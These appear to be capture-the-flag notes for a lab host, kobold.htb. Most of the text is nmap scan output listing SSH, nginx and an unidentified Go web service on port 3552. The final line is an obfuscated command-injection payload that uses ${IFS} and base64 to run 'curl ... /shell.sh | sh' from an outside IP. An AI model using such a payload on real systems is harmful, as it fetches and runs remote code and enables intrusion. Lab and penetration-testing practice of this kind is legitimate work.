    Starting Nmap 7.98 ( https://nmap.org ) at 2026-04-07 01:53 +0200
    Nmap scan report for 10.129.22.230
    Host is up (0.094s latency).
    Not shown: 65527 closed tcp ports (reset), 4 filtered tcp ports (no-response)
    Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
    PORT     STATE SERVICE  VERSION
    22/tcp   open  ssh      OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
    | ssh-hostkey:
    |   256 8c:45:12:36:03:61:de:0f:0b:2b:c3:9b:2a:92:59:a1 (ECDSA)
    |_  256 d2:3c:bf:ed:55:4a:52:13:b5:34:d2:fb:8f:e4:93:bd (ED25519)
    80/tcp   open  http     nginx 1.24.0 (Ubuntu)
    |_http-server-header: nginx/1.24.0 (Ubuntu)
    |_http-title: Did not follow redirect to https://kobold.htb/
    443/tcp  open  ssl/http nginx 1.24.0 (Ubuntu)
    |_ssl-date: TLS randomness does not represent time
    |_http-server-header: nginx/1.24.0 (Ubuntu)
    | tls-alpn:
    |   http/1.1
    |   http/1.0
    |_  http/0.9
    |_http-title: 400 The plain HTTP request was sent to HTTPS port
    | ssl-cert: Subject: commonName=kobold.htb
    | Subject Alternative Name: DNS:kobold.htb, DNS:*.kobold.htb
    | Not valid before: 2026-03-15T15:08:55
    |_Not valid after:  2125-02-19T15:08:55
    3552/tcp open  http     Golang net/http server
    |_http-title: Site doesn't have a title (text/html; charset=utf-8).
    | fingerprint-strings:
    |   GenericLines:
    |     HTTP/1.1 400 Bad Request
    |     Content-Type: text/plain; charset=utf-8
    |     Connection: close
    |     Request
    |   GetRequest:
    |     HTTP/1.0 200 OK
    |     Accept-Ranges: bytes
    |     Cache-Control: no-cache, no-store, must-revalidate
    |     Content-Length: 2081
    |     Content-Type: text/html; charset=utf-8
    |     Expires: 0
    |     Pragma: no-cache
    |     Date: Mon, 06 Apr 2026 23:54:33 GMT
    |     <!doctype html>
    |     <html lang="%lang%">
    |     <head>
    |     <meta charset="utf-8" />
    |     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    |     <meta http-equiv="Pragma" content="no-cache" />
    |     <meta http-equiv="Expires" content="0" />
    |     <link rel="icon" href="/api/app-images/favicon" />
    |     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
    |     <link rel="manifest" href="/app.webmanifest" />
    |     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
    |     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
    |     <link rel="modu
    |   HTTPOptions:
    |     HTTP/1.0 200 OK
    |     Accept-Ranges: bytes
    |     Cache-Control: no-cache, no-store, must-revalidate
    |     Content-Length: 2081
    |     Content-Type: text/html; charset=utf-8
    |     Expires: 0
    |     Pragma: no-cache
    |     Date: Mon, 06 Apr 2026 23:54:35 GMT
    |     <!doctype html>
    |     <html lang="%lang%">
    |     <head>
    |     <meta charset="utf-8" />
    |     <meta http-equiv="Cache-Control" content="no-cache, no-store, must-revalidate" />
    |     <meta http-equiv="Pragma" content="no-cache" />
    |     <meta http-equiv="Expires" content="0" />
    |     <link rel="icon" href="/api/app-images/favicon" />
    |     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover" />
    |     <link rel="manifest" href="/app.webmanifest" />
    |     <meta name="theme-color" content="oklch(1 0 0)" media="(prefers-color-scheme: light)" />
    |     <meta name="theme-color" content="oklch(0.141 0.005 285.823)" media="(prefers-color-scheme: dark)" />
    |_    <link rel="modu
    1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
    SF-Port3552-TCP:V=7.98%I=7%D=4/7%Time=69D447B8%P=x86_64-pc-linux-gnu%r(Gen
    SF:ericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
    SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
    SF:0Request")%r(GetRequest,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
    SF:20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate\
    SF:r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=ut
    SF:f-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Mon,\x2006\x20A
    SF:pr\x202026\x2023:54:33\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang=
    SF:\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\
    SF:x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x20
    SF:must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content=
    SF:\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0\
    SF:"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"\
    SF:x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
    SF:x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\n
    SF:\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\t
    SF:<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20me
    SF:dia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"t
    SF:heme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20me
    SF:dia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20rel
    SF:=\"modu")%r(HTTPOptions,8FF,"HTTP/1\.0\x20200\x20OK\r\nAccept-Ranges:\x
    SF:20bytes\r\nCache-Control:\x20no-cache,\x20no-store,\x20must-revalidate\
    SF:r\nContent-Length:\x202081\r\nContent-Type:\x20text/html;\x20charset=ut
    SF:f-8\r\nExpires:\x200\r\nPragma:\x20no-cache\r\nDate:\x20Mon,\x2006\x20A
    SF:pr\x202026\x2023:54:35\x20GMT\r\n\r\n<!doctype\x20html>\n<html\x20lang=
    SF:\"%lang%\">\n\t<head>\n\t\t<meta\x20charset=\"utf-8\"\x20/>\n\t\t<meta\
    SF:x20http-equiv=\"Cache-Control\"\x20content=\"no-cache,\x20no-store,\x20
    SF:must-revalidate\"\x20/>\n\t\t<meta\x20http-equiv=\"Pragma\"\x20content=
    SF:\"no-cache\"\x20/>\n\t\t<meta\x20http-equiv=\"Expires\"\x20content=\"0\
    SF:"\x20/>\n\t\t<link\x20rel=\"icon\"\x20href=\"/api/app-images/favicon\"\
    SF:x20/>\n\t\t<meta\x20name=\"viewport\"\x20content=\"width=device-width,\
    SF:x20initial-scale=1,\x20maximum-scale=1,\x20viewport-fit=cover\"\x20/>\n
    SF:\t\t<link\x20rel=\"manifest\"\x20href=\"/app\.webmanifest\"\x20/>\n\t\t
    SF:<meta\x20name=\"theme-color\"\x20content=\"oklch\(1\x200\x200\)\"\x20me
    SF:dia=\"\(prefers-color-scheme:\x20light\)\"\x20/>\n\t\t<meta\x20name=\"t
    SF:heme-color\"\x20content=\"oklch\(0\.141\x200\.005\x20285\.823\)\"\x20me
    SF:dia=\"\(prefers-color-scheme:\x20dark\)\"\x20/>\n\t\t\n\t\t<link\x20rel
    SF:=\"modu");
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    Nmap done: 1 IP address (1 host up) scanned in 86.95 seconds

---

    /bin/sh -c echo${IFS}Y3VybCBodHRwOi8vMTAuMTAuMTYuMjEvc2hlbGwuc2ggfCBzaAo=|base64${IFS}-d|sh
